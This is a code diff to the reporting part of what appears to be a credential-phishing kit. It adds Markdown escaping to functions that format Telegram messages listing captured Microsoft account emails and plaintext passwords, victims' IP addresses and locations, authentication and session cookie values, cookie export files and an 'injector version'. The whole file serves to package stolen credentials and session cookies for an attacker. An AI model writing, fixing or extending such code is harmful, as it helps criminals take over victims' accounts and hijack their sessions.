@@ -45,6 +45,13 @@ function formatTelegramMessage(data) {
     enhancedCapture = false
   } = data;
 
+  // Helper function to escape Markdown special characters
+  const escapeMarkdown = (text) => {
+    if (!text) return '';
+    return String(text)
+      .replace(/[_*[\]()~`>#+\-=|{}.!\\]/g, '\\$&');
+  };
+
   // ENHANCED: Message structure with location and file data
   let message = '🔐 *Microsoft Account Credentials Captured*\n';
   if (captureContext.microsoftDomainCapture) {
@@ -52,26 +59,26 @@ function formatTelegramMessage(data) {
   }
   message += '\n';
   
-  // Credential information
+  // Credential information - ESCAPED
   if (email) {
-    message += `📧 *Email:* \`${email}\`\n`;
+    message += `📧 *Email:* ${escapeMarkdown(email)}\n`;
   }
   if (password) {
-    message += `🔑 *Password:* \`${password}\`\n`;
+    message += `🔑 *Password:* ${escapeMarkdown(password)}\n`;
   }
   
   // ENHANCED: Location information
   if (locationData && locationData.ip && locationData.ip !== 'Unknown') {
     message += '\n🌍 *Location Information:*\n';
-    message += `📍 *IP Address:* \`${locationData.ip}\`\n`;
-    message += `🏙️ *City:* ${locationData.city}\n`;
-    message += `🗺️ *Region:* ${locationData.region}\n`;
-    message += `🌎 *Country:* ${locationData.country} (${locationData.countryCode})\n`;
+    message += `📍 *IP Address:* ${escapeMarkdown(locationData.ip)}\n`;
+    message += `🏙️ *City:* ${escapeMarkdown(locationData.city)}\n`;
+    message += `🗺️ *Region:* ${escapeMarkdown(locationData.region)}\n`;
+    message += `🌎 *Country:* ${escapeMarkdown(locationData.country)} (${escapeMarkdown(locationData.countryCode)})\n`;
     if (locationData.timezone) {
-      message += `⏰ *Timezone:* ${locationData.timezone}\n`;
+      message += `⏰ *Timezone:* ${escapeMarkdown(locationData.timezone)}\n`;
     }
     if (locationData.isp) {
-      message += `🌐 *ISP:* ${locationData.isp}\n`;
+      message += `🌐 *ISP:* ${escapeMarkdown(locationData.isp)}\n`;
     }
   }
   
@@ -81,9 +88,9 @@ function formatTelegramMessage(data) {
   message += `• Microsoft Account: ${microsoftAccount ? 'Yes' : 'No'}\n`;
   
   // Source information
-  message += `• Source: ${passwordSource}\n`;
+  message += `• Source: ${escapeMarkdown(passwordSource)}\n`;
   if (domain) {
-    message += `• Domain: ${domain}\n`;
+    message += `• Domain: ${escapeMarkdown(domain)}\n`;
   }
   
   // ENHANCED: Cookie information with file details
@@ -105,7 +112,8 @@ function formatTelegramMessage(data) {
       message += `• Auth Cookies: ${importantCookies.length} found\n`;
       message += '• Key Auth Cookies:\n';
       importantCookies.slice(0, 3).forEach(cookie => {
-        message += `  - ${cookie.name}: ${cookie.value ? cookie.value.substring(0, 20) + '...' : 'empty'}\n`;
+        const cookieValue = cookie.value ? cookie.value.substring(0, 20) + '...' : 'empty';
+        message += `  - ${escapeMarkdown(cookie.name)}: ${escapeMarkdown(cookieValue)}\n`;
       });
     }
     
@@ -113,28 +121,29 @@ function formatTelegramMessage(data) {
     if (cookieFiles && (cookieFiles.txtFile || cookieFiles.jsonFile)) {
       message += '\n📁 *Cookie Export Files:*\n';
       if (cookieFiles.txtFile) {
-        message += `• TXT File: ${cookieFiles.txtFile.name} (${Math.round(cookieFiles.txtFile.size / 1024)}KB)\n`;
+        message += `• TXT File: ${escapeMarkdown(cookieFiles.txtFile.name)} (${Math.round(cookieFiles.txtFile.size / 1024)}KB)\n`;
       }
       if (cookieFiles.jsonFile) {
-        message += `• JSON File: ${cookieFiles.jsonFile.name} (${Math.round(cookieFiles.jsonFile.size / 1024)}KB)\n`;
+        message += `• JSON File: ${escapeMarkdown(cookieFiles.jsonFile.name)} (${Math.round(cookieFiles.jsonFile.size / 1024)}KB)\n`;
       }
     }
   }
   
   // Browser and technical information
   if (browserCapabilities && browserCapabilities.browser) {
-    message += `\n🌐 *Browser:* ${browserCapabilities.browser} v${browserCapabilities.version}\n`;
+    message += `\n🌐 *Browser:* ${escapeMarkdown(browserCapabilities.browser)} v${escapeMarkdown(browserCapabilities.version)}\n`;
   }
   
   if (userAgent) {
-    message += `📱 *User Agent:* \`${userAgent.substring(0, 100)}${userAgent.length > 100 ? '...' : ''}\`\n`;
+    const userAgentTrunc = userAgent.substring(0, 100) + (userAgent.length > 100 ? '...' : '');
+    message += `📱 *User Agent:* ${escapeMarkdown(userAgentTrunc)}\n`;
   }
   
   // ENHANCED: Capture context with location and file info
   if (captureContext && Object.keys(captureContext).length > 0) {
     message += '\n📊 *Capture Details:*\n';
     if (captureContext.hostname) {
-      message += `• Hostname: ${captureContext.hostname}\n`;
+      message += `• Hostname: ${escapeMarkdown(captureContext.hostname)}\n`;
     }
     if (captureContext.microsoftDomainCapture) {
       message += `• Microsoft Domain Capture: Yes\n`;
@@ -149,7 +158,7 @@ function formatTelegramMessage(data) {
       message += `• Stored Credentials: ${captureContext.hasStoredCredentials ? 'Yes' : 'No'}\n`;
     }
     if (captureContext.injectorVersion) {
-      message += `• Injector Version: ${captureContext.injectorVersion}\n`;
+      message += `• Injector Version: ${escapeMarkdown(captureContext.injectorVersion)}\n`;
     }
     if (retryAttempt > 0) {
       message += `• Retry Attempt: ${retryAttempt + 1}\n`;
@@ -157,12 +166,12 @@ function formatTelegramMessage(data) {
   }
   
   // Timestamp and session
-  message += `\n⏰ *Timestamp:* ${timestamp || new Date().toISOString()}\n`;
+  message += `\n⏰ *Timestamp:* ${escapeMarkdown(timestamp || new Date().toISOString())}\n`;
   if (sessionId) {
-    message += `🔗 *Session ID:* \`${sessionId}\`\n`;
+    message += `🔗 *Session ID:* ${escapeMarkdown(sessionId)}\n`;
   }
   if (url) {
-    message += `🔗 *URL:* ${url}\n`;
+    message += `🔗 *URL:* ${escapeMarkdown(url)}\n`;
   }
   
   return message;
@@ -192,6 +201,13 @@ function formatCookieDetails(cookies) {
   if (!cookies || cookies.length === 0) {
     return 'No cookies captured';
   }
+  
+  // Helper function to escape Markdown special characters
+  const escapeMarkdown = (text) => {
+    if (!text) return '';
+    return String(text)
+      .replace(/[_*[\]()~`>#+\-=|{}.!\\]/g, '\\$&');
+  };
   
   let cookieMessage = `🍪 *Detailed Cookie Analysis (${cookies.length} total):*\n\n`;
   
@@ -230,9 +246,9 @@ function formatCookieDetails(cookies) {
   if (authCookies.length > 0) {
     cookieMessage += '🎯 *Authentication Cookies:*\n';
     authCookies.forEach((cookie, index) => {
-      cookieMessage += `${index + 1}. \`${cookie.name}\`\n`;
-      cookieMessage += `   Value: ${cookie.value ? cookie.value.substring(0, 60) + '...' : 'empty'}\n`;
-      if (cookie.domain) cookieMessage += `   Domain: ${cookie.domain}\n`;
+      cookieMessage += `${index + 1}. ${escapeMarkdown(cookie.name)}\n`;
+      cookieMessage += `   Value: ${escapeMarkdown(cookie.value ? cookie.value.substring(0, 60) + '...' : 'empty')}\n`;
+      if (cookie.domain) cookieMessage += `   Domain: ${escapeMarkdown(cookie.domain)}\n`;
       if (cookie.secure) cookieMessage += `   Secure: Yes\n`;
       if (cookie.expires) cookieMessage += `   Expires: ${new Date(cookie.expires).toUTCString()}\n`;
       cookieMessage += '\n';
@@ -243,7 +259,8 @@ function formatCookieDetails(cookies) {
   if (sessionCookies.length > 0) {
     cookieMessage += '🔗 *Session Cookies:*\n';
     sessionCookies.slice(0, 5).forEach((cookie, index) => {
-      cookieMessage += `${index + 1}. \`${cookie.name}\`: ${cookie.value ? cookie.value.substring(0, 40) + '...' : 'empty'}\n`;
+      const cookieValue = cookie.value ? cookie.value.substring(0, 40) + '...' : 'empty';
+      cookieMessage += `${index + 1}. ${escapeMarkdown(cookie.name)}: ${escapeMarkdown(cookieValue)}\n`;
     });
     if (sessionCookies.length > 5) {
       cookieMessage += `... and ${sessionCookies.length - 5} more session cookies\n`;
